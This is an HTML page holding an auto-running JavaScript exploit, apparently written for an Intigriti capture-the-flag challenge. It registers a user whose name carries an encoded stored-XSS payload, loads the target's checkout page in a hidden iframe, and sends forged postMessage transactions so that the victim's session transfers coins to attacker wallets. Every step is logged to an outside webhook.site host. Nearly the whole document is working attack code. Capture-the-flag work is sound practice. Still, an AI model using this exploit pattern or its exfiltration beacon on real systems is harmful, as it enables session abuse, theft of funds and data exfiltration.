<!DOCTYPE html>
<html>
<head><title>FINAL</title></head>
<body>
<h1>FINAL EXPLOIT</h1>
<div id="log"></div>
<script>
const T = 'https://challenge-0126.intigriti.io';
const W = 'https://webhook.site/a3a1e2a1-9f98-4553-bc84-7cdbea8fdf30';
const WALLET = '16472226db03703a192aa383237035a69f';
let s = 0;

function log(m) { s++; document.getElementById('log').innerHTML += '<div>['+s+'] '+m+'</div>'; new Image().src = W+'/?'+s+'='+encodeURIComponent(m); }

async function exploit() {
    log('STARTING');

    // HTML entity XSS payload for username
    const xssUser = 'test&lt;img src=x onerror=&quot;fetch(\''+W+'/?xss=1\',{mode:\'no-cors\'})&quot;&gt;';

    try {
        // Step 1: Register XSS user
        log('Registering XSS user...');
        const reg = await fetch(T+'/api/register',{
            method:'POST',headers:{'Content-Type':'application/json'},
            body:JSON.stringify({username:xssUser,password:'Test123!'})
        });
        log('Register: '+reg.status);
        const regData = await reg.json();
        if(!reg.ok && !regData.error?.toLowerCase().includes('exists')) {
            log('Register failed: '+JSON.stringify(regData));
        }

        // Step 2: Login as XSS user
        log('Logging in as XSS user...');
        const login = await fetch(T+'/api/login',{
            method:'POST',headers:{'Content-Type':'application/json'},
            credentials:'include',
            body:JSON.stringify({username:xssUser,password:'Test123!'})
        });
        log('Login: '+login.status);

        if(login.ok) {
            // Step 3: Get XSS user's wallet address
            log('Getting wallet address...');
            const me = await fetch(T+'/api/me',{credentials:'include'});
            const meData = await me.json();
            log('me: '+JSON.stringify(meData));

            const xssWallet = meData.wallets?.find(w => w.currency === '1337COIN');
            if(xssWallet) {
                log('XSS wallet: '+xssWallet.address);

                // Step 4: Load checkout iframe
                log('Loading checkout...');
                const iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                iframe.src = T + '/checkout.html?currency=1337COIN&price=0';
                document.body.appendChild(iframe);
                await new Promise(r => setTimeout(r, 3000));

                // Step 5: Send coins to XSS user via admin session
                log('Sending coins to XSS user...');
                iframe.contentWindow.postMessage({
                    type: 'submitTransaction',
                    transaction: {
                        toAddress: xssWallet.address,
                        currency: '1337COIN',
                        amount: 1
                    }
                }, '*');
                log('Coins sent to XSS user - XSS should trigger in marketwatch');

                // Step 6: Also send to our wallet
                await new Promise(r => setTimeout(r, 1000));
                log('Sending to target wallet...');
                iframe.contentWindow.postMessage({
                    type: 'submitTransaction',
                    transaction: {
                        toAddress: WALLET,
                        currency: '1337COIN',
                        amount: 1
                    }
                }, '*');
                log('Sent to target wallet');
            }
        }
    } catch(e) {
        log('Error: '+e.message);
    }

    await new Promise(r => setTimeout(r, 2000));
    log('Opening marketwatch...');
    window.open(T+'/marketwatch.html','_blank');
    log('DONE');
}

setTimeout(exploit, 1000);
</script>
</body>
</html>
